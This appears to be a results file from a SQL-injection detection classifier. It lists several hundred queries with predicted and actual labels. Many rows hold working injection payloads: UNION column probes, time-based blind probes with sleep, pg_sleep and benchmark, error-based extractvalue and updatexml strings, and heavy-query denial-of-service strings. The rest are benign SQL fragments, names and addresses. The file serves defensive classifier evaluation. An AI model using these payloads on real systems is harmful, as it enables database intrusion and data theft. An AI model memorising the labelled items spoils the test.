,Query,Prediction,Actual
7001,1  )   as nxmd where 8650  =  8650,0,1.0
7002,cabarrs zafn,0,0.0
7003,"1 where 6100  =  6100 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",0,1.0
7004,"-4340   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   8505  =  8505",0,1.0
7005,"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""nepk""  =  ""nepk",0,1.0
7006,"-6194"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",0,1.0
7007,"INSERT INTO remain ( disappear, drawn, bite, number, rough, please )  VALUES  ( 'fifteen', 'dance'. seed', 'lack', 'period', 'ten', 'task' )  ",0,0.0
7008,33744160d,0,0.0
7009,3m6noja4,0,0.0
7010,SELECT * FROM himself WHERE dried BETWEEN '1996-07-01' AND '1996-07-31',0,0.0
7011,tramaced,0,0.0
7012,1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,0,1.0
7013,SELECT * FROM bad WHERE baby BETWEEN row09/01/1996moving AND mood15/31/1996development,0,0.0
7014,"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 177 )  ORDER BY meta_id ASC",0,0.0
7015,"INSERT INTO got  ( buried, human, plural )  VALUES  ( 'steam', 'likely', 'third' )  ",0,0.0
7016,1680,0,0.0
7017,valdearcos de la vega,0,0.0
7018,"1 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",0,1.0
7019,elsen@whitehat.td,0,0.0
7020,"-9634'   )    )     )   union all select 4141,4141#",0,1.0
7021,"1"" where 5333  =  5333 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",0,1.0
7022,"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",0,1.0
7023,"1""  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",0,1.0
7024,"1%'  )   union all select null,null,null,null,null,null,null,null--",0,1.0
7025,SELECT spring ( s )  FROM hope SELECT horn FROM diagram,0,0.0
7026,"1%""   )    )     )   union all select null,null,null,null,null,null--",0,1.0
7027,SELECT cost ( s )  FROM hurt LEFT JOIN,0,0.0
7028,"1%'   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,1.0
7029,SELECT COS ( PI (   )  )  ;,0,0.0
7030,8352,0,0.0
7031,wieth@camiones-hibridos.md,0,0.0
7032,1'+  (  select ukwc where 3008  =  3008 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,0,1.0
7033,"calle ter, 20,",0,0.0
7034,"1"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""utzr"" like ""utzr",0,1.0
7035,9810,0,0.0
7036,SELECT * FROM single,0,0.0
7037,1  )   rlike sleep  (  5  )   and   (  5724  =  5724,0,1.0
7038,"macario, 87,",0,0.0
7039,sureda bahamonde,0,0.0
7040,"-7142'   )    )    union all select 5083,5083,5083,5083#",0,1.0
7041,"1,  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",0,1.0
7042,DELETE FROM world,0,0.0
7043,SELECT * FROM have WHERE egg BETWEEN '1996-07-01' AND '1996-07-31',0,0.0
7044,mandruso,0,0.0
7045,"1'  )   as dajk where 1452  =  1452 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",0,1.0
7046,6.69143E+14,0,0.0
7047,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  '%'  =  '",0,1.0
7048,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",0,1.0
7049,1   )    )     )   rlike sleep  (  5  )   and    (    (     (  6790  =  6790,0,1.0
7050,"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  8600  =  8600",0,1.0
7051,SELECT chain FROM service UNION SELECT square FROM breathing ORDER BY inside,0,0.0
7052,"  SELECT Orders.letterrID, Employees.silence, Employees.dinner FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.everyID ORDER BY Orders.trackID",0,0.0
7053,kelcy,0,0.0
7054,SELECT * FROM sort WHERE riding = 'discover'  AND City = 'life',0,0.0
7055,SELECT * FROM glass  WHERE sat = blanket,0,0.0
7056,"-2378"" where 2686  =  2686 or 6872  =  6872--",0,1.0
7057,"-3261""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""yxms""  =  ""yxms",0,1.0
7058,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'fpaf'  =  'fpaf",0,1.0
7059,"-2028'   )    )     )   union all select 8698,8698,8698,8698#",0,1.0
7060,canales,0,0.0
7061,SELECT * FROM brain WHERE guard = 'political',0,0.0
7062,condensativo,0,0.0
7063,peralejos de abajo,1,0.0
7064,"1'+  (  select sfmz where 4870  =  4870 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,1.0
7065,-2303'   )    )    as exyt where 2528  =  2528 or 8571  =  8571--,0,1.0
7066,"1'||  (  select 'asfl' from dual where 5846  =  5846 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",0,1.0
7067,"1'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",0,1.0
7068,"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 12389 )  ORDER BY meta_id ASC",0,0.0
7069,"-5904"" where 9782  =  9782 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",0,1.0
7070,1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,0,1.0
7071,general ricardos 187,0,0.0
7072,"1' and make_set  (  2942  =  8200,8200  )   and 'jnhv' like 'jnhv",0,1.0
7073,"1'+  (  select zfpk where 9784  =  9784 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",0,1.0
7074,SELECT day ( s )  FROM exchange,0,0.0
7075,28177i6sa,0,0.0
7076,1%'  )   and sleep  (  5  )  #,0,1.0
7077,olmos de ojeda,0,0.0
7078,bevis,0,0.0
7079,r3i8a83nt1,0,0.0
7080,"-9408%""   )    )    union all select 1841,1841,1841,1841,1841,1841--",0,1.0
7081,imperial 143,0,0.0
7082,SELECT * FROM her WHERE yes BETWEEN deep09/01/1996slept AND division15/31/1996aware,0,0.0
7083,"INSERT INTO bark  ( triangle, due, potatoes )  VALUES  ( 'felt', 'graph', 'beside' )  ",0,0.0
7084,"INSERT INTO stronger  ( coming, still, correctly )  VALUES  ( 'jack', 'worse', 'egg' )  ",0,0.0
7085," SELECT * FROM express ORDER BY whispered ASC, plain DESC",0,0.0
7086,1   )    )    as uvep where 6016  =  6016 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,0,1.0
7087,sobrado,0,0.0
7088,SELECT * FROM remove WHERE pool IN  ( SELECT one FROM phrase ) ,0,0.0
7089,machar,0,0.0
7090,"-4927'   )    )    union all select 1924,1924#",0,1.0
7091,1'||  (  select 'mwpd' where 2887  =  2887,0,1.0
7092,5.26636E+15,0,0.0
7093,"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- zvkh",0,1.0
7094,SELECT * FROM pay WHERE powder = 'manner'  OR pilot = 'saddle',0,0.0
7095,"  SELECT enemyID AS ID, kill AS ride FROM dollar",0,0.0
7096,torremocha del campo,0,0.0
7097,"1  )   where 5309  =  5309 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",0,1.0
7098,DELETE FROM tail,0,0.0
7099,"carretera nacional 139, 9?a",0,0.0
7100,quiles,0,0.0
7101,SELECT MIN ( might )  AS famous FROM soap,0,0.0
7102,"  SELECT fastened,fall FROM wash WHERE enter = 'play' UNION SELECT seven, block FROM certainly",0,0.0
7103,SELECT hundred ( s )  FROM sort LEFT JOIN,0,0.0
7104,SELECT hand ( s )  FROM mine LEFT JOIN,0,0.0
7105,SELECT * FROM worry WHERE engine BETWEEN 'struggle' AND 'activity',0,0.0
7106,"-3868'   )    )    or make_set  (  6809  =  1236,1236  )   and    (    (   'evnj'  =  'evnj",0,1.0
7107,SELECT COUNT ( valueID ) FROM he,0,0.0
7108,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""unju""  =  ""unju",0,1.0
7109,"SELECT WEEKOFYEAR ( ""2017-01-01"" ) ;",0,0.0
7110,34964894h,0,0.0
7111,"1'  )   as ccee where 8880  =  8880 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",0,1.0
7112,SELECT AVG ( breath ) FROM protection,0,0.0
7113,SELECT COUNT ( DISTINCT father )  FROM castle,0,0.0
7114,-9197'  )   or   (  6877  =  8010  )  *8010 and   (  'umwl'  =  'umwl,0,1.0
7115,frades,0,0.0
7116,"1%' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '%'  =  '",0,1.0
7117,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,0,1.0
7118, or userid like '%,0,1.0
7119,"INSERT INTO `wp_options`  ( `option_name`, `option_value`, `autoload` )  VALUES  ( '_transient_doing_cron', '1630907689.8412559032440185546875', 'yes' )  ON DUPLICATE KEY UPDATE `option_name`  =  VALUES ( `option_name` ) , `option_value`  =  VALUES ( `option_value` ) , `autoload`  =  VALUES ( `autoload` ) ",0,0.0
7120,donhierro,0,0.0
7121,spruance@maquillajeparalabios.ro,0,0.0
7122,"1""  )   as esks where 1138  =  1138",0,1.0
7123,lester_muenster@erasmusrooms.org,1,0.0
7124,"SELECT * FROM pole WHERE fifty BETWEEN ""floor"" AND    ""neck""",0,0.0
7125,SELECT * FROM Customers  WHERE City LIKE 'L_n_on';,0,0.0
7126,zahn,0,0.0
7127,SELECT TOP 3 * FROM son SELECT * FROM race 3SELECT * FROM year,0,0.0
7128,"1""   )    )    rlike sleep  (  5  )  #",0,1.0
7129,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",0,1.0
7130,"-2007' where 9157  =  9157 union all select 9157,9157,9157,9157,9157,9157,9157,9157,9157#",0,1.0
7131,SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367652 ) ,0,0.0
7132,66750565b,0,0.0
7133,select   (  case when   (  5970  =  2200  )   then 1 else 5970*  (  select 5970 from master..sysdatabases  )   end  )  --,0,1.0
7134,FROM  ( SELECT DISTINCT instance FROM pay ) ,0,0.0
7135,"SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 28313,28341 ) ",0,0.0
7136,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  ""bqfj"" like ""bqfj",0,1.0
7137,SELECT * FROM happened WHERE rice = 'giant',0,0.0
7138,21292,0,0.0
7139,SELECT * FROM adjective WHERE larger IN  ( SELECT tried FROM pond ) ,0,0.0
7140,SELECT * FROM visit WHERE Price NOT BETWEEN 10 AND 20,0,0.0
7141,aran1el1ria,0,0.0
7142," select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",0,1.0
7143,SELECT until FROM nobody,0,0.0
7144,SELECT * FROM corn,0,0.0
7145,6448,0,0.0
7146,1%'   )    )     )   union all select null--,0,1.0
7147,"1"" where 3740  =  3740 rlike sleep  (  5  )  #",0,1.0
7148,"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",0,1.0
7149,select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,0,1.0
7150,maragliano serna,0,0.0
7151,"-4944%""   )    )    or make_set  (  1084  =  1988,1988  )   and    (    (   ""%""  =  """,0,1.0
7152,8.65216E+15,0,0.0
7153,SELECT * FROM reader FETCH FIRST 50 PERCENT ROWS ONLY,0,0.0
7154,"1%""   )    )     )   and 8438  =  7620--",0,1.0
7155,1'+  (  select 'kcix' where 1117  =  1117,0,1.0
7156,"   SELECT Employees.can, COUNT ( Orders.afterID )  AS meanFROM    ( OrdersINNER JOIN husband ON Orders.longID  =  Employees.copyID ) ",0,0.0
7157,distinct,0,1.0
7158,SELECT DISTINCT corner FROM shore,0,0.0
7159,3953,0,0.0
7160,"-8432  )   union all select 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--",0,1.0
7161,or pg_sleep  (  __TIME__  )  --,0,1.0
7162,prell@davidymamen.tc,0,0.0
7163,"   SELECT report, rod, shownFROM speech WHERE bell  IS NOT NULL",0,0.0
7164,SELECT shells ( s )  FROM people SELECT he ( s ) ,0,0.0
7165,dobbing3,0,0.0
7166,"-9871""  )   union all select 9082#",0,1.0
7167,"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'sqni' like 'sqni",0,1.0
7168,17005940q,0,0.0
7169,43595,0,0.0
7170,SELECT wherever ( s ) FROM degree INNER JOIN,0,0.0
7171,SELECT * FROM recently WHERE coat = 'excellent' LIMIT 3,0,0.0
7172, (  select   (  case when   (  8130  =  5894  )   then 8130 else 8130*  (  select 8130 from information_schema.character_sets  )   end   )    ) ,0,1.0
7173,"1 and elt  (  3114  =  3114,sleep  (  5   )    )   #",0,1.0
7174,5323,0,0.0
7175, UPDATE replace SET smooth = 'instrument'WHERE rapidly = 'cream',0,0.0
7176,"  SELECT todayID AS ID, world AS scale FROM favorite",0,0.0
7177,caballol menocal,0,0.0
7178," SELECT column_name ( s )  FROM serve,fill",0,0.0
7179,SELECT egg ( s )  FROM substance SELECT shot FROM manufacturing,0,0.0
7180,SELECT COUNT ( continent ) FROM crack,0,0.0
7181,1'+  (  select hvsb where 3666  =  3666,0,1.0
7182,SELECT AVG ( army ) FROM build SELECT SUM ( running ) ,0,0.0
7183,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",0,1.0
7184,"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",0,1.0
7185,37748,0,0.0
7186,"-5288'  )   or make_set  (  1164  =  1710,1710  )   and   (  'pkwy'  =  'pkwy",0,1.0
7187,FROM  ( SELECT DISTINCT taught FROM roof ) ,0,0.0
7188,1'  )   where 8429  =  8429,0,1.0
7189,"1""  )   as vcir where 6275  =  6275 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",0,1.0
7190,SELECT * FROM train WHERE sometime = 'flag'  OR circle = 'battle',0,0.0
7191,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",0,1.0
7192,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'afdy' like 'afdy",0,1.0
7193,SELECT hall FROM hour,0,0.0
7194,SELECT rich ( s )  FROM sail UNION ALL,0,0.0
7195,clooney,1,0.0
7196,15423399j,0,0.0
7197,SELECT * FROM part,0,0.0
7198,4.10842E+15,0,0.0
7199,1  )   where 7159  =  7159,0,1.0
7200,SELECT * FROM strong WHERE event = 'obtain'  OR phrase = 'daughter',0,0.0
7201,SELECT * FROM yes WHERE strength NOT BETWEEN 'country' AND 'tie',0,0.0
7202,-2790'   )    )    or 8571  =  8571--,0,1.0
7203,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,0,1.0
7204,SELECT * FROM than WHERE Price NOT BETWEEN 10 AND 20,0,0.0
7205,SELECT * FROM read WHERE NOT high = 'cowboy'  AND NOT water = 'wore',0,0.0
7206,SELECT * FROM recognize WHERE total = 'double'  AND  ( than = 'flow' OR tribe = 'beginning' ) ,0,0.0
7207,"-1868   )    )    union all select 1859,1859--",0,1.0
7208,"1""  )   where 6903  =  6903",0,1.0
7209,"1'||  (  select 'ativ' from dual where 4746  =  4746 union all select null,null,null,null#",0,1.0
7210,"  SELECT * FROM above WHERE lips IN  ( 'adult', 'decide', 'our' )  ",0,0.0
7211,ordinar,0,0.0
7212,"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'dtym'  =  'dtym",0,1.0
7213,1  )   where 8232  =  8232 and   (  3020  =  3020  )  *6703--,0,1.0
7214,SELECT * FROM across FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM reason,0,0.0
7215,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",0,1.0
7216,SELECT * FROM imagine FETCH FIRST 50 PERCENT ROWS ONLY,0,0.0
7217,SELECT * FROM lack WHERE dark LIKE '%effort%',0,0.0
7218,SELECT * FROM ground WHERE origin NOT LIKE '[exciting]%',0,0.0
7219,"-5661'   )    )    union all select 3011,3011#",0,1.0
7220,1.71456E+15,0,0.0
7221,strom.mahieuy4@karldeux.ac,0,0.0
7222,"INSERT INTO die ( smallest, rice, measure, these, truth, distance )  VALUES  ( 'court', 'live'. five', 'boy', 'package', 'determine', 'seven' )  ",0,0.0
7223,FROM  ( SELECT DISTINCT gold FROM my ) ,0,0.0
7224,SELECT COUNT ( whom ) FROM pattern,0,0.0
7225,SELECT * FROM close WHERE found = 'pool' LIMIT 3,0,0.0
7226,ribadumia,0,0.0
7227,SELECT club ( s )  FROM drawn SELECT roar ( s ) ,0,0.0
7228,"-4413%'   )    )    union all select 1345,1345#",0,1.0
7229,"  UPDATE call SET member =  'fifteen', City =  'roar' WHERE first =  spend",0,0.0
7230,SELECT AVG ( military ) FROM entirely,0,0.0
7231,SELECT * FROM probably  WHERE thou NOT LIKE '[account]%',0,0.0
7232,"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""buzb""  =  ""buzb",0,1.0
7233,64sfa4imiento,0,0.0
7234,kaempfe amilibia,0,0.0
7235,stella mara,0,0.0
7236,SELECT * FROM pair WHERE your = 'corn' FETCH FIRST 3 ROWS ONLY,0,0.0
7237,SELECT Count ( * )  AS small,0,0.0
7238,taghizad,0,0.0
7239,7548,0,0.0
7240,SELECT AVG ( motor ) FROM explore,0,0.0
7241,"1""  )   as ybkp where 7788  =  7788 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",0,1.0
7242,SELECT AVG ( smell ) FROM alive SELECT SUM ( subject ) ,0,0.0
7243,"1'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'holo'  =  'holo",0,1.0
7244,"iif  (  5257  =  5257,1,1/0  )  ",0,1.0
7245,2.03996E+15,0,0.0
7246,end and    (    (     (  'xzbk'  =  'xzbk,0,1.0
7247,SELECT AVG ( me ) FROM physical,0,0.0
7248," select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",0,1.0
7249,11140,0,0.0
7250,"1 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",0,1.0
7251,25938703q,0,0.0
7252,SELECT MIN ( partly )  AS usually FROM combination,0,0.0
7253,"1   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",0,1.0
7254,SELECT TOP 3 * FROM seldom WHERE fresh = 'piano',0,0.0
7255,SELECT COUNT ( joined ) FROM won,0,0.0
7256,morlanes funosa,0,0.0
7257,73034797e,0,0.0
7258,gervasio,0,0.0
7259,myers@naturalchild.so,0,0.0
7260,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null--",0,1.0
7261,SELECT difference,0,0.0
7262,SELECT rising ( s FROM turn RIGHT JOIN,0,0.0
7263,SELECT * FROM handsome FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM except,0,0.0
7264,"INSERT INTO south ( second, distant, exclaimed, exactly, wealth, sure )  VALUES  ( 'factor', 'bus'. arrive', 'lucky', 'on', 'nails', 'column' )  ",0,0.0
7265,novallas,0,0.0
7266,4.08791E+15,0,0.0
7267,1'||  (  select 'ptkj' from dual where 6263  =  6263 union all select null--,0,1.0
7268,SELECT waste ( s )  FROM direct SELECT putting ( s ) ,0,0.0
7269,"SELECT * FROM Users WHERE Name  = """" or """" = """" AND Pass  = """" or """" = """"",0,0.0
7270,5.9555E+15,0,0.0
7271,"""  )   or sleep  (  __TIME__  )    =  """,0,1.0
7272,SELECT * FROM column  WHERE star NOT LIKE '[drawn]%',0,0.0
7273,"SELECT * FROM band WHERE sad BETWEEN ""cover"" AND    ""without""",0,0.0
7274,calle gurugu 142 4?d,0,0.0
7275,"SELECT * FROM courage WHERE railroad BETWEEN ""dangerous"" AND    ""nice""",0,0.0
7276,SELECT * FROM fifteen WHERE using = 'baby' LIMIT 3,0,0.0
7277,-3748' where 9292  =  9292 or 3337  =  2859#,0,1.0
7278,equilibrio,0,0.0
7279,SELECT TOP 50 PERCENT * FROM nodded,0,0.0
7280,"1'+  (  select immd where 7499  =  7499 union all select null,null,null,null,null,null,null,null#",0,1.0
7281,select sleep  (  5  )   and    (    (     (  5552  =  5552,0,1.0
7282,"1""  )   as qjyu where 2679  =  2679 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",0,1.0
7283,pl. emilio simon 28,0,0.0
7284,SELECT AVG ( all )  FROM these  SELECT SUM ( jump ) ,0,0.0
7285," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",0,1.0
7286,847,0,0.0
7287, UPDATE return SET camera = 'pond'WHERE of = 'such',0,0.0
7288,"  UPDATE bark SET few =  'vapor', City =  'subject' WHERE alphabet =  pretty",0,0.0
7289,claudine,1,0.0
7290,SELECT AVG ( lift ) FROM page SELECT SUM ( mark ) ,0,0.0
7291," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",0,1.0
7292,"select * from generate_series  (  2317,2317,case when   (  2317  =  9706  )   then 1 else 0 end  )   limit 1--",0,1.0
7293,28530,0,0.0
7294,SELECT * FROM doing ORDER BY week DESC,0,0.0
7295,-3540 where 7302  =  7302 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,0,1.0
7296,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""pdqm"" like ""pdqm",0,1.0
7297,1   )    )    as cwyb where 3633  =  3633,0,1.0
7298,"1' where 2332  =  2332 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",0,1.0
7299,1' where 8159  =  8159 union all select null#,0,1.0
7300,SELECT solve FROM popular UNION SELECT find FROM helpful ORDER BY wheel,0,0.0
7301,1' and 7533  =  7533 and 'clqy' like 'clqy,0,1.0
7302,SELECT bowl ( s )  FROM piano,0,0.0
7303,SELECT * FROM stared WHERE bottom = 'grandmother' FETCH FIRST 3 ROWS ONLY,0,0.0
7304,SELECT COUNT ( swam ) FROM this,0,0.0
7305,7118,0,0.0
7306,SELECT number ( s )  FROM here FULL OUTER JOIN,0,0.0
7307,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  '%'  =  '",0,1.0
7308,SELECT TOP 50 PERCENT * FROM busy,0,0.0
7309, UPDATE refused SET dance = 'job'WHERE worth = 'sister',0,0.0
7310,SELECT ruler ( s )  FROM liquid,0,0.0
7311,SELECT * FROM across FETCH FIRST 3 ROWS ONLY,0,0.0
7312,canal saracho,0,0.0
7313,"   SELECT Employees.bound, COUNT ( Orders.thirdID )  AS mineralsFROM    ( OrdersINNER JOIN off ON Orders.theeID  =  Employees.minuteID ) ",0,0.0
7314,"1 where 8908  =  8908 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",0,1.0
7315,SELECT TOP 50 PERCENT * FROM compound,0,0.0
7316,revivificar,0,0.0
7317,SELECT * FROM consist WHERE add BETWEEN 'example' AND 'birthday',0,0.0
7318,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',0,1.0
7319,wynnie,1,0.0
7320,valbuena de duero,0,0.0
7321,SELECT COUNT ( pride ) FROM adjective,0,0.0
7322,"  SELECT ranchID AS ID, his AS how FROM syllable",0,0.0
7323,"1  )   where 1415  =  1415 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",0,1.0
